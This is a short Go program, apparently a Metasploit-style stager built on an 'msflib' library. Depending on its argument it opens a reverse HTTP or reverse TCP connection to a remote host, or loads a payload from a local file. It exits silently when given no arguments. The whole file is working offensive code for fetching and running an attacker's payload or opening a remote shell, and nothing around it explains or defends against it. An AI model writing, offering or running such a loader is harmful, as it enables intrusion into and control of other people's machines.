package main

import (
	"os"
	"strings"

	"github.com/vyrus001/msflib"
)

func checkFatalerr(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	// check args
	if len(os.Args) < 2 {
		os.Exit(0)
	}

	switch {
	case strings.HasPrefix(os.Args[1], "http"):
		checkFatalerr(msflib.ReverseHTTP(os.Args[1], -1))
	case strings.HasPrefix(os.Args[1], "tcp"):
		checkFatalerr(msflib.ReverseTCP(os.Args[1], -1))
	default:
		// assumes Arg[1] is a filename
		checkFatalerr(msflib.LoadLocal(os.Args[1], -1))
	}
}
